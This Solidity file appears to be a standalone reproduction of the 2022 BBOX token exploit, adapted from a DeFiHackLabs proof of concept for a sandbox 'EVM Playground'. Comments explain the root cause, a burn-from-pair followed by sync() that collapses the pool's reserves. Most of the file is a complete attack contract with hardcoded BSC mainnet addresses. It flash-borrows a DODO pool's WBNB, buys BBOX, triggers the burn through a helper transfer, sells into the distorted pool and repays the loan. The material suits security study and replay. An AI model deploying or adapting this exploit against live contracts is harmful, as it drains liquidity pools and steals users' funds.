// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-BBOX).
//
// The DeFiHackLabs PoC (test/BBOX_exp.sol) runs the attack INLINE in the
// Foundry `ContractTest` harness — the DODO DVM flash-loan callback
// `DVMFlashLoanCall` lives on the test itself (`attacker = address(this)`),
// and a separate `TransferBBOXHelp` helper is `new`'d mid-attack to perform a
// plain BBOX.transfer() between two non-pair accounts (which trips the token's
// burn-from-pair + sync() code path without hitting the sell-time/amount guards).
// So there is no single standalone contract to deploy.
//
// This file is a faithful, self-contained copy of that inline attack
// (testExploit body → run() entrypoint; DVMFlashLoanCall callback preserved;
// the TransferBBOXHelp helper is deployed via `new` from run(); minimal inline
// interfaces — no imports so it compiles anywhere). Logic and constants are
// copied verbatim from test/BBOX_exp.sol, compiled inside the registry forge
// project.
//
// Root cause: BBOXToken._transfer() burns `pairAmount` worth of BBOX out of the
// LP pair's OWN balance (`_tOwned[uniswapV2Pair] -= v`) and then calls
// IUniswapV2Pair(pair).sync() — an uncompensated, one-sided reserve deletion
// that collapses the constant-product k. `pairAmount` is attacker-controlled
// (it accrues +3% of every taxed buy/sell), so an attacker buys BBOX (seeding
// pairAmount just under the pair's balance), transfers the bought BBOX between
// two non-pair addresses (tripping the burn+sync), then sells back into the
// now WBNB-heavy / BBOX-starved pool for far more WBNB than the buy cost.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

// Minimal helper that just forwards its entire BBOX balance to the caller —
// a plain transfer between two non-pair addresses, which is the path that
// trips BBOXToken's burn-from-pair + sync() without the sell guards.
contract TransferBBOXHelp {
    IERC20 constant BBOX = IERC20(0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c);

    function transferBBOX() external {
        BBOX.transfer(msg.sender, BBOX.balanceOf(address(this)));
    }
}

contract BBOXDrain {
    IERC20 constant BBOX = IERC20(0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniswapV2Router02 constant Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    address constant DODO = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4; // DVM flash-loan source

    uint256 flashLoanAmount; // amount borrowed from DODO (its full WBNB balance)
    address helper; // the TransferBBOXHelp instance (BBOX buy recipient / burn trigger)

    // step 1: flash-borrow ALL WBNB from the DODO DVM pool. The callback below drains it.
    function run() external {
        flashLoanAmount = WBNB.balanceOf(DODO);
        // Deploy the helper mid-attack (the buy output is routed here so the next BBOX
        // movement is a clean non-pair transfer that trips the burn).
        helper = address(new TransferBBOXHelp());
        WBNB.approve(address(Router), type(uint256).max);
        BBOX.approve(address(Router), type(uint256).max);
        IDVM(DODO).flashLoan(flashLoanAmount, 0, address(this), new bytes(1));
    }

    // DODO DVM flash-loan callback (DPPFlashLoanCall — this DVM pool calls back
    // under that selector). The pool optimistically sent out the WBNB; here the
    // attacker pumps the pair, trips the burn-from-pair + sync, dumps back into
    // the degenerate pool, and repays the loan.
    function DPPFlashLoanCall(
        address, // sender
        uint256, // baseAmount
        uint256, // quoteAmount
        bytes calldata // data
    ) external {
        WBNBToBBOX(); // buy BBOX with 1300 WBNB, recipient = helper (seeds pairAmount)
        TransferBBOXHelp(helper).transferBBOX(); // plain transfer → burn pairAmount from pair + sync()
        BBOXToWBNB(); // sell 90% of BBOX back into the WBNB-heavy pool
        WBNB.transfer(DODO, flashLoanAmount); // repay the flash loan
    }

    function WBNBToBBOX() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BBOX);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1300 * 1e18, 0, path, helper, block.timestamp
        );
    }

    function BBOXToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(BBOX);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BBOX.balanceOf(address(this)) * 90 / 100, 0, path, address(this), block.timestamp
        );
    }
}
